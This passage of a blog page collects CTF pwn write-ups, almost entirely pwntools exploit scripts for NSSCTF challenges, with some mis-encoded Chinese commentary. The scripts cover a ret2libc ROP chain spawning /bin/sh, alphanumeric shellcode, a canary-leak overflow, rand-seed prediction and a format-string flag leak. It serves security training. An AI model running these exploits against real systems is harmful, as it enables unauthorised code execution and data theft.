class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if a:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â p=process(&amp;#x27;./pw&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28892)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./pw&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi_pop=0x400733&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=0x4004c9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main=elf.sym[&amp;#x27;main&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt=elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got=elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x20+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts_plt)+p64(main)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;story!&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts=u64(p.recvuntil(b&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8,b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(puts)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=LibcSearcher(&amp;#x27;puts&amp;#x27;,puts)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base=puts-libc.dump(&amp;#x27;puts&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=libc_base+libc.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;str_bin_sh=libc_base+libc.dump(&amp;#x27;str_bin_sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2=b&amp;#x27;a&amp;#x27;*(0x20+0x8)+p64(ret)+p64(rdi_pop)+p64(str_bin_sh)+p64(system)+p64(main)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1safe_shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1safe_shellcode&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]safe_shellcode&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28251)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=&amp;quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00gao@fossa&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hgame-2022-week1test-your-gdb&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hgame-2022-week1test-your-gdb&#34;&gt;#&lt;/a&gt; [HGAME 2022 week1]test your gdb&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;pwn import *&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#p = process(&amp;quot;./../testYourGdb&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;quot;./../testYourGdb&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&amp;quot;1.14.71.254&amp;quot;,28150)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cmpText = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = 0x401256&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(b&amp;#x27;word\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(cmpText)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv(0x18)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canary = u64(p.recv(8))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(hex(canary))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;padding = b&amp;#x27;a&amp;#x27; * (0x28 - 0x10)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = padding + p64(canary) + p64(0) + p64(binsh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1ezr0p64&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1ezr0p64&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]ezr0p64&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;å·²ç»ç»™äº†.so.6äº†ç›´æ¥æ‰“ret2libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.os=&amp;#x27;linux&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./ezrop64&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ELF(&amp;#x27;./libc.so.6&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28053)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi_ret = 0x4012a3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = 0x40101a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln = elf.sym[&amp;#x27;vuln&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(b&amp;quot;:&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_addr = int(p.recv(14),16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(puts_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = puts_addr - libc.sym[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + libc.sym[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = libc_base + next(libc.search(b&amp;quot;/bin/sh\x00&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x108 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;gdouctf-2023çœŸç”·äººä¸‹120å±‚&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gdouctf-2023çœŸç”·äººä¸‹120å±‚&#34;&gt;#&lt;/a&gt; [GDOUCTF 2023] çœŸç”·äººä¸‹ 120 å±‚&lt;/h5&gt;
&lt;p&gt;å¥—ç€ä¸¤å±‚ rand éœ€è¦å®šä¹‰ä¸¤æ¬¡ srand ä½¿ç”¨ python çš„ ctypes çš„åº“æ¥è¿›è¡Œè§£é¢˜&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import ctypes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ctypes.CDLL(&amp;#x27;/lib/x86_64-linux-gnu/libc.so.6&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand.argtypes=[ctypes.c_uint]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand(libc.time(0))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand_result=libc.rand()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand(rand_result%3-1522127470)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28105)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;#x27;trap.&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in range(120):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  rand_r=libc.rand()%4+1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  p.recvuntil(b&amp;#x27;Floor&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Â  Â  p.sendline(str(rand_r))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hubuctf-2022-æ–°ç”Ÿèµ›fmt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hubuctf-2022-æ–°ç”Ÿèµ›fmt&#34;&gt;#&lt;/a&gt; [HUBUCTF 2022 æ–°ç”Ÿèµ›] fmt&lt;/h5&gt;
&lt;p&gt;æœ¬åœ°æµ‹è¯•æŸ¥çœ‹ flag.txt è¢«è¯»åçš„æ ˆåœ°å€çœ‹åˆ°åç§»å¤šå°‘åˆ©ç”¨ % p æ¥è·å¾— flag&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28473)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# get flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# æ ¹æ® format å’Œ s åœ¨æ ˆä¸Šçš„ç›¸å¯¹ä½ç½®è®¡ç®—è¯»å–ä½ç½®ï¼š(0x60 - 0x40 / 8) + 5 = 12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag_addr = 12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag = &amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;while True:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(b&amp;#x27;Echo as a service&amp;#x27;, &amp;#x27;%&amp;#123;&amp;#125;$p&amp;#x27;.format(flag_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(b&amp;#x27;0x&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    part = p.recvuntil(b&amp;#x27;\n&amp;#x27;)[:-1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for i in range(0, len(part), 2):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        index = len(part) - i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        flag += chr(int(part[index - 2:index].ljust(2, b&amp;#x27;0&amp;#x27;), 16))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if &amp;#x27;&amp;#125;&amp;#x27; in flag:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    flag_addr += 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1ezcmp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1ezcmp&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]ezcmp&lt;/h5&gt;
